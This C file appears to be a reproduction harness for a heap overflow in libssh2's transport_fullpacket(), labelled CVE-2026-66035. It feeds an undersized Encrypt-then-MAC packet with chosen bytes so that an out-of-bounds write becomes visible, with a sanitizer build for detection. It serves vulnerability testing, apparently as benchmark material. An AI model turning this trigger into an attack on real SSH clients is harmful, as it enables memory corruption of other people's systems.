/* libssh2 CVE-2026-66035 harness. transport_fullpacket() below is extracted
 * verbatim from the pinned libssh2/src/transport.c by gen_fn.py. Only the
 * minimal type/macro/function stubs and the driver are local. Build at -O0.
 *
 * Attack model: a malicious SSH server sends an Encrypt-then-MAC packet whose
 * total_num is smaller than mac_len + 4 + blocksize. The pinned vulnerable
 * code computes decrypt_size = total_num - mac_len - 4, allocates that many
 * bytes, then copies blocksize-1 bytes from the decrypted first block into it.
 */
#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct _LIBSSH2_SESSION LIBSSH2_SESSION;

#define MAX_MACSIZE 64
#define MAX_BLOCKSIZE 16
#define LIBSSH2_TRACE_SOCKET 4
#define LIBSSH2_PACKET_MAXDECOMP 1024
#define LIBSSH2_ERROR_DECRYPT (-18)
#define LIBSSH2_ERROR_ALLOC (-6)
#define LIBSSH2_ERROR_PROTO (-8)
#define LIBSSH2_ERROR_EAGAIN (-81)
#define SSH2_STATE_AUTHENTICATED 1
#define SSH_MSG_NEWKEYS 21
#define FIRST_BLOCK 1
#define LAST_BLOCK 2
#define SSH2_MAC_CONFIRMED 1
#define SSH2_MAC_INVALID 0

typedef enum { ssh2_NB_state_idle = 0, ssh2_NB_state_created = 1 } ssh2_NB_state;

#define CRYPT_FLAG_R(s, f) (0)
#define ssh2_deb(x) do { } while (0)
#define transport_debugdump(a, b, c, d) do { } while (0)
#define SSH2_ALLOC(s, n) malloc((size_t)(n))
#define SSH2_FREE(s, p) free(p)
#define SSH2_SAFEFREE(s, p) do { free(p); (p) = NULL; } while (0)

struct crypt_method { int blocksize; };

typedef int (*mac_hash_fn)(LIBSSH2_SESSION *, unsigned char *, uint32_t,
                           const unsigned char *, size_t,
                           const unsigned char *, size_t, void **);
struct mac_method { int etm; size_t mac_len; mac_hash_fn hash; };

typedef int (*decomp_fn)(LIBSSH2_SESSION *, unsigned char **, size_t *, size_t,
                         const unsigned char *, size_t, void **);
struct comp_method { int compress; int use_in_auth; decomp_fn decomp; };

struct transportpacket {
    uint32_t packet_length;
    size_t total_num;
    unsigned char *payload;
    unsigned char init[16];
    unsigned char padding_length;
};

struct _LIBSSH2_SESSION {
    struct {
        uint32_t seqno;
        struct mac_method *mac;
        struct crypt_method *crypt;
        void *mac_abstract;
        struct comp_method *comp;
        void *comp_abstract;
    } remote;
    struct { struct comp_method *comp; } local;
    struct transportpacket packet;
    int fullpacket_state;
    int fullpacket_macstate;
    size_t fullpacket_payload_len;
    unsigned char fullpacket_packet_type;
    int packAdd_state;
    int kex_strict;
    int state;
};

/* Harness stubs: MAC always confirms; the "decrypted" first block carries
 * chosen bytes so the readback shows exactly what the memcpy wrote. */
static int stub_hash(LIBSSH2_SESSION *s, unsigned char *mac, uint32_t seq,
                     const unsigned char *a, size_t alen,
                     const unsigned char *b, size_t blen, void **abs)
{
    (void)s; (void)seq; (void)a; (void)alen; (void)b; (void)blen; (void)abs;
    memset(mac, 0, MAX_MACSIZE);
    return 0;
}

#ifndef CHOSEN_BASE
#define CHOSEN_BASE 0x41
#endif

static unsigned char *g_written_buffer;

static int transport_decrypt(LIBSSH2_SESSION *s, unsigned char *src,
                             unsigned char *dest, ssize_t len, int firstlast)
{
    (void)s; (void)src; (void)firstlast;
    dest[0] = 4; /* padding_length, must be <= packet_length - 1 */
    for (ssize_t i = 1; i < len; ++i)
        dest[i] = (unsigned char)(CHOSEN_BASE + (i - 1));
    return 0;
}

static int ssh2_timingsafe_bcmp(const void *a, const void *b, size_t n)
{
    (void)a; (void)b; (void)n;
    return 0; /* MAC valid */
}

static int ssh2_packet_add(LIBSSH2_SESSION *s, unsigned char *payload,
                           size_t len, int macstate, uint32_t seq)
{
    (void)s; (void)len; (void)macstate; (void)seq;
    g_written_buffer = payload;
    return 0;
}

#include "transport_fn.inc"

#ifndef TOTAL_NUM
#define TOTAL_NUM 28
#endif
#ifndef MAC_LEN
#define MAC_LEN 20
#endif
#ifndef BLOCKSIZE
#define BLOCKSIZE 16
#endif

#if defined(__SANITIZE_ADDRESS__)
#define FRONTIER_ASAN 1
#elif defined(__has_feature)
#if __has_feature(address_sanitizer)
#define FRONTIER_ASAN 1
#endif
#endif

int main(void)
{
    static LIBSSH2_SESSION session;
    static struct crypt_method crypt;
    static struct mac_method mac;

    memset(&session, 0, sizeof(session));
    crypt.blocksize = BLOCKSIZE;
    mac.etm = 1;
    mac.mac_len = MAC_LEN;
    mac.hash = stub_hash;
    session.remote.crypt = &crypt;
    session.remote.mac = &mac;
    session.fullpacket_state = ssh2_NB_state_idle;

    unsigned char *wire = malloc(TOTAL_NUM);
    memset(wire, 0, TOTAL_NUM);
    session.packet.payload = wire;
    session.packet.total_num = TOTAL_NUM;
    session.packet.packet_length = (uint32_t)(TOTAL_NUM - MAC_LEN);

    int rc = transport_fullpacket(&session, 1);
    printf("rc=%d total_num=%d mac_len=%d blocksize=%d decrypt_size=%ld\n",
           rc, TOTAL_NUM, MAC_LEN, BLOCKSIZE, (long)(TOTAL_NUM - MAC_LEN - 4));

#ifndef FRONTIER_ASAN
    printf("readback=");
    for (int i = 0; i < BLOCKSIZE + 3; ++i)
        printf("%02x", g_written_buffer ? g_written_buffer[i] : 0);
    printf("\n");
#endif
    return 0;
}
